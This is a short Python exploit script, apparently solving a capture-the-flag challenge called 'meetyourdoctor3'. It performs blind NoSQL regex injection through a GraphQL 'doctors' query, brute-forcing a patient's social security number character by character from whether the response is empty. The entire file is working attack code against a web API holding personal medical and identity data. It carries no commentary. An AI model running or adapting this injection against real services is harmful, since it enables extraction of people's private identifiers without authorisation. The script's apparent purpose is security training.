#!/usr/bin/env python3

import requests
import json

ssn_example='82c478fc-f219-49ea-af02-96d27c1b395a'
ch_set='0123456789abcdef-'

data1 = r'{"operationName":null,"variables":{},"query":"{\r\n  doctors(\r\n    options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", \r\n    search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\"^'

data2 = r'.*\\\"}, \\\"firstName\\\":\\\"Admin\\\"}\")\r\n    {\r\n      firstName lastName id patients{ssn}\r\n    }\r\n}"}'

url = 'http://meetyourdoctor3.challs.malice.fr/graphql'
headers = {'content-type': 'application/json'}

proxies = {
  'http': 'http://10.0.2.2:8080',
}

ssn = ''
while len(ssn) < len(ssn_example):
    for c in ch_set:
        data = data1 + ssn + c + data2
        r = requests.post(url, headers=headers, data=data, proxies=proxies)
        result = json.loads(r.text)
        if len(result['data']['doctors']) != 0:
            ssn += c
            print(ssn)
            break

print('result:' + ssn)
